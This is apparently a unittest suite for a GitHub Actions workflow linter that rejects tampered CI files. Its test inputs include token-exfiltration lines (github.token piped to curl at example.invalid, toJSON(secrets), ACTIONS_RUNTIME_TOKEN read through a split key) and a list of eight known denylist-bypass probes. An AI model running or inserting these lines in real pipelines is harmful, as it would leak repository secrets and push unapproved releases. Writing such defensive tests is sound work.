import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, "tools")
import workflow_lint as w  # noqa: E402

BASE = Path(".github/workflows/ci.yml").read_text(encoding="utf-8")
GATE = Path(".github/workflows/gate.yml").read_bytes().decode("utf-8")
SHA = "11d5960a326750d5838078e36cf38b85af677262"
NIGHTLY = "name: nightly\non:\n  schedule:\n    - cron: '0 3 * * *'\n  workflow_dispatch:\njobs:\n  nightly:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo nightly\n"
BASE_FILES = {"ci.yml": BASE, "nightly.yml": NIGHTLY, "gate.yml": GATE}


def write_tree(files):
    root = Path(tempfile.mkdtemp())
    wf = root / ".github" / "workflows"
    wf.mkdir(parents=True)
    for name, text in files.items():
        if text is None:
            continue
        target = root / name if name.startswith(".github/") else wf / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(text.encode("utf-8"))
    return root


BASELINE = w.baseline_from_tree(write_tree(BASE_FILES))


def check(overrides=None, baseline=None):
    files = dict(BASE_FILES)
    for key, text in (overrides or {}).items():
        if key.startswith(".github/workflows/"):
            key = key[len(".github/workflows/"):]
        files[key] = text
    return w.check_tree(write_tree(files), baseline or BASELINE)


def replace_once(text, old, new):
    assert text.count(old) == 1, old
    return text.replace(old, new)


class Negative(unittest.TestCase):
    def assertRejects(self, needle, overrides=None, baseline=None):
        with self.assertRaises(w.LintError) as ctx:
            check(overrides, baseline)
        self.assertIn(needle, str(ctx.exception))

    def ci(self, text):
        return {"ci.yml": text}

    # Structure and guard (original cases)
    def test_01_duplicate_on(self):
        self.assertRejects("duplicate key: 'on'", self.ci("on: push\n" + BASE))

    def test_02_duplicate_jobs(self):
        self.assertRejects("duplicate key: 'jobs'", self.ci(BASE + "jobs:\n  x:\n    runs-on: x\n"))

    def test_03_duplicate_steps(self):
        self.assertRejects("duplicate key: 'steps'", self.ci(replace_once(BASE, "    needs: verify\n", "    needs: verify\n    steps:\n      - run: echo x\n")))

    def test_04_duplicate_run(self):
        self.assertRejects("duplicate key: 'run'", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n        run: echo two\n")))

    def test_05_on_disabled(self):
        self.assertRejects("triggers changed", self.ci(replace_once(BASE, "on:\n  pull_request:\n  push:\n    branches: [main]\n", "on: []\n")))

    def test_06_guard_if_false(self):
        self.assertRejects("guard-verify job changed", self.ci(replace_once(BASE, "  guard-verify:\n", "  guard-verify:\n    if: false\n")))

    def test_07_guard_renamed(self):
        self.assertRejects("guard-verify job missing", self.ci(replace_once(BASE, "  guard-verify:\n", "  guard-verify-x:\n")))

    def test_08_pull_request_trigger_removed(self):
        self.assertRejects("triggers changed", self.ci(replace_once(BASE, "  pull_request:\n", "")))

    def test_09_merge_key(self):
        self.assertRejects("merge key", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    <<: {runs-on: x}\n")))

    def test_10_anchor_alias(self):
        self.assertRejects("anchor", self.ci(replace_once(BASE, "    runs-on: ubuntu-24.04\n    steps:\n      - run: echo verify", "    runs-on: &r ubuntu-24.04\n    steps:\n      - run: echo verify")))

    def test_11_guard_shell_changed(self):
        self.assertRejects("guard-verify job changed", self.ci(replace_once(BASE, "  guard-verify:\n", "  guard-verify:\n    defaults:\n      run:\n        shell: sh\n")))

    def test_12_guard_checkout_ref_changed(self):
        self.assertRejects("guard-verify job changed", self.ci(replace_once(BASE, "      - run: echo guard\n", "      - uses: actions/checkout@" + SHA + "\n        with:\n          ref: main\n")))

    def test_13_guard_uses_replaced(self):
        self.assertRejects("guard-verify job changed", self.ci(replace_once(BASE, "      - run: echo guard\n", "      - uses: actions/checkout@" + SHA + "\n")))

    def test_14_new_publish_job(self):
        text = BASE + ("  publish:\n    runs-on: x\n    steps:\n      - uses: actions/upload-artifact@" + SHA + "\n        with:\n          name: x\n          path: x\n")
        self.assertRejects("unapproved", self.ci(text))

    def test_15_composite_action(self):
        self.assertRejects("composite", {".github/actions/x/action.yml": "name: x\n"})

    def test_16_gh_release_in_run(self):
        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: gh release create v1 x\n")))

    def test_18_ambiguous_bool_key(self):
        self.assertRejects("ambiguous bool key", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    yes:\n      x: 1\n")))

    # Workflow set
    def test_19_nightly_deleted(self):
        self.assertRejects("removed or renamed", {".github/workflows/nightly.yml": None})

    def test_20_workflow_added(self):
        self.assertRejects("added or renamed", {".github/workflows/extra.yml": "on: push\njobs:\n  x:\n    runs-on: x\n    steps: []\n"})

    def test_21_ci_renamed(self):
        self.assertRejects("removed or renamed", {".github/workflows/ci.yml": None, ".github/workflows/ci2.yml": BASE})

    def test_22_nightly_schedule_removed(self):
        self.assertRejects("triggers changed", {".github/workflows/nightly.yml": NIGHTLY.replace("  schedule:\n    - cron: '0 3 * * *'\n", "")})

    def test_23_nightly_disabled(self):
        self.assertRejects("triggers changed", {".github/workflows/nightly.yml": NIGHTLY.replace("on:\n  schedule:\n    - cron: '0 3 * * *'\n  workflow_dispatch:\n", "on: []\n")})

    def test_24_baseline_publish_route_dropped(self):
        self.assertRejects("baseline publish route removed", None, dict(BASELINE, publish=["ci.yml:verify"]))

    def test_25_candidate_cannot_extend_baseline(self):
        text = BASE + ("  publish:\n    runs-on: x\n    steps:\n      - uses: actions/upload-artifact@" + SHA + "\n        with:\n          name: x\n          path: x\n")
        self.assertRejects("unapproved", self.ci(text))

    def test_26_fake_guard_in_block_scalar(self):
        text = "name: |\n  guard-verify:\n    needs: verify\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo guard\non:\n  pull_request:\n  push:\n    branches: [main]\njobs:\n  verify:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo verify\n  guard-verify:\n    if: ${{ false }}\n    needs: verify\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo guard\n"
        self.assertRejects("guard-verify job changed", self.ci(text))

    # M1: job- and step-level flags
    def test_27_job_if_expression(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    if: github.event_name == 'push'\n")))

    def test_28_step_if_false(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - if: false\n        run: echo verify\n")))

    def test_29_step_continue_on_error(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n        continue-on-error: true\n")))

    def test_30_step_shell_changed(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n        shell: bash {0}\n")))

    def test_45_job_continue_on_error(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    continue-on-error: true\n")))

    def test_46_job_environment(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    environment: trusted-gate\n")))

    def test_47_job_env(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    env:\n      X: 1\n")))

    def test_48_job_defaults(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    defaults:\n      run:\n        shell: sh\n")))

    def test_49_job_runs_on_self_hosted(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n    runs-on: ubuntu-24.04\n", "  verify:\n    runs-on: [self-hosted]\n")))

    def test_52_id_token_permission(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    permissions:\n      id-token: write\n")))

    def test_35_write_all_permissions(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "permissions:\n  contents: read\n", "permissions: write-all\n")))

    # M2: trigger values
    def test_43_push_branches_changed(self):
        self.assertRejects("triggers changed", self.ci(replace_once(BASE, "branches: [main]", "branches: [nope]")))

    def test_44_paths_ignore_added(self):
        self.assertRejects("triggers changed", self.ci(replace_once(BASE, "  pull_request:\n", "  pull_request:\n    paths-ignore: ['**']\n")))

    def test_36_pull_request_target_in_ci(self):
        self.assertRejects("triggers changed", self.ci(replace_once(BASE, "  pull_request:\n", "  pull_request_target:\n")))

    def test_37_int_key_collides_with_on(self):
        self.assertRejects("non-string key", self.ci(replace_once(BASE, "on:\n  pull_request:\n  push:\n    branches: [main]\n", "on: []\n1:\n  pull_request:\n  push:\n    branches: [main]\n")))

    def test_38_timestamp_job_id(self):
        self.assertRejects("non-string key", self.ci(BASE + "2024-01-01:\n  runs-on: x\n"))

    def test_39_uppercase_workflow_added(self):
        self.assertRejects("added or renamed", {".github/workflows/EXTRA.YML": BASE})

    # M3: action references, with, env, external uses
    def test_31_job_level_external_uses(self):
        self.assertRejects("local reusable workflow", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    uses: evil/x/.github/workflows/p.yml@" + SHA + "\n")))

    def test_32_unknown_action_step(self):
        self.assertRejects("unapproved flag", self.ci(BASE + "  x:\n    runs-on: x\n    steps:\n      - uses: evil/thing@" + SHA + "\n"))

    def test_50_checkout_with_repository_changed(self):
        text = BASE + "  co:\n    runs-on: x\n    steps:\n      - uses: actions/checkout@" + SHA + "\n        with:\n          repository: attacker/x\n"
        self.assertRejects("unapproved flag", self.ci(text))

    def test_51_secret_reference_in_run(self):
        self.assertRejects("unapproved flag", self.ci(BASE + "  s:\n    runs-on: x\n    steps:\n      - run: echo ${{ secrets.APP_PRIVATE_KEY }}\n"))

    # M4: publish routes
    def test_33_npm_publish_run(self):
        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: npm publish\n")))

    def test_34_git_push_tags_run(self):
        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: git push origin HEAD:refs/tags/v1\n")))

    def test_53_docker_buildx_push_run(self):
        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: docker buildx build --push -t x .\n")))

    def test_54_gem_push_run(self):
        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo verify\n      - run: gem push x.gem\n")))

    # M5: gate.yml protected as a whole
    def test_40_candidate_gate_adds_pull_request(self):
        self.assertRejects("triggers changed", {"gate.yml": replace_once(GATE.replace("\r\n", "\n"), "  pull_request_target:\n", "  pull_request:\n  pull_request_target:\n")})

    def test_41_candidate_gate_run_body_changed(self):
        self.assertRejects("gate.yml changed", {"gate.yml": replace_once(GATE.replace("\r\n", "\n"), "if python3 tools/trusted_gate.py candidate", "if true || python3 tools/trusted_gate.py candidate")})

    def test_55_gate_deleted(self):
        self.assertRejects("removed or renamed", {".github/workflows/gate.yml": None})

    def test_56_base_guard_missing(self):
        files = dict(BASE_FILES)
        files["ci.yml"] = replace_once(BASE, "  guard-verify:\n", "  guard-verify-x:\n")
        with self.assertRaises(w.LintError) as ctx:
            w.baseline_from_tree(write_tree(files))
        self.assertIn("base guard-verify job missing", str(ctx.exception))


    def test_58_job_name_spoof(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "  verify:\n", "  verify:\n    name: trusted-gate\n")))

    def test_59_secret_via_tojson_in_run(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo ${{ toJSON(secrets) }}\n")))

    def test_60_top_level_name_spoof(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "name: ci\n", "name: trusted-gate\n")))

    def test_61_secret_bracket_access_in_run(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo ${{ secrets[\x27APP_PRIVATE_KEY\x27] }}\n")))

    def test_62_github_token_in_run_pipe(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo ${{ github.token }} | curl -sS -d @- https://example.invalid/c\n")))

    def test_63_actions_prefix_split_key(self):
        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: python3 -c \"import os; os.environ[\x27ACTIONS_\x27+\x27RUNTIME_TOKEN\x27]\"\n")))

    def test_64_semantic_release_run(self):
        self.assertRejects("unapproved", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: npx --yes semantic-release\n")))

class DenylistProbes(unittest.TestCase):
    """M4 option B: run bodies are exact-baseline flags. These are the eight
    inputs that previously bypassed the run-text denylist (reviewer D1-D8)."""

    PROBES = [
        "D=docker; $D push ghcr.io/x:1",
        "git push origin v1.0.0",
        "npx -y release-it",
        "gh api -X POST repos/o/r/releases",
        "cargo +stable publish",
        "wget --post-file=x.tgz https://uploads.github.com/x",
        "echo ${{ github['token'] }} | curl -d @- https://example.invalid",
        "python3 -c \"import os; os.environ['ACTIONS'+'NS_RUNTIME_TOKEN']\"",
    ]

    def test_all_eight_bypass_probes_rejected(self):
        for probe in self.PROBES:
            with self.subTest(probe=probe):
                text = replace_once(BASE, "      - run: echo verify\n", "      - run: |\n          " + probe + "\n")
                with self.assertRaises(w.LintError) as ctx:
                    check({"ci.yml": text})
                self.assertIn("unapproved flag", str(ctx.exception))


class Positive(unittest.TestCase):
    def test_control_passes(self):
        self.assertEqual(check(), set())

    def test_17_multiline_run_body_change_needs_approval(self):
        text = replace_once(BASE, "      - run: echo verify\n", "      - run: |\n          echo verify\n          # if: false\n")
        with self.assertRaises(w.LintError) as ctx:
            check({"ci.yml": text})
        self.assertIn("unapproved flag", str(ctx.exception))

    def test_57_verify_run_change_needs_approval(self):
        with self.assertRaises(w.LintError) as ctx:
            check({"ci.yml": replace_once(BASE, "run: echo verify", "run: echo verify-changed")})
        self.assertIn("unapproved flag", str(ctx.exception))

    def test_58_unchanged_nightly_and_gate_accepted(self):
        self.assertEqual(check(), set())

if __name__ == "__main__":
    unittest.main()
